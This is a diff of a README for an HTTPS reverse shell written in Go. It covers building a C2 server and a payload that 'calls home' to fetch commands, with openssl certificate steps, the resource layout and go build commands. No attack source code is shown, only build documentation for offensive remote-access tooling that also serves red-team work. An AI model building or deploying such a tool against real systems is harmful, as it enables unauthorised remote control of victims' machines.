@@ -2,17 +2,54 @@
 
 A HTTPS reverse shell implemented in the Go programming language. 
 
-## Instructions
+## Prerequisites
 
-In order to build, you need to create a server cert/key pair. Then put the ```server.cert``` and  ```server.key```  into ```c2/resources``` and the ```server.cert``` as well into ```payload/resources```.
+* You need to have ```Golang``` installed on your system and have the variables ```$GOPATH``` and ```$GOBIN``` set.
+* Install ```go-bindata``` via ```$ go get -u github.com/go-bindata/go-bindata/...``` 
+(and install to bin via ```$ go install```)
+* Install ```openssl``` in order to generate your cert/key pair.
 
-You can create the pair for example like this:
+## Build
 
-```$ openssl genrsa -out server.key 2048```
+In order to build, you need to create a server cert/key pair like this:
 
-```$ openssl req -new -x509 -sha256 -key server.key -out server.crt -days 3650```
+```
+$ openssl genrsa -out server.key 2048
+$ openssl req -new -x509 -sha256 -key server.key -out server.crt -days 3650
+```
 
-Now run ```$ go install payload.go``` and ```$ go install c2.payload``` and the binaries will be created in your ```$GOBIN``` folder.
+
+Put the ```server.cert``` and  ```server.key```  into the corresponding resource directories:
+
+```
+c2  
+└─resources
+│    server.crt
+│    server.key
+payload
+└─resources
+│    server.crt
+
+```
+
+Now you need to generate the resource file and build the binary:
+
+```
+$ cd c2 && go generate && go build
+$ cd payload && go generate && go build
+```
+
+Eventually, you can run the binaries:
+
+```
+$ ./c2
+[+] Server listening on (:4433)
+```
+
+```
+$ ./payload
+[+] Calling home to c2 to get cmd...
+```
 
 ## Functionality
 
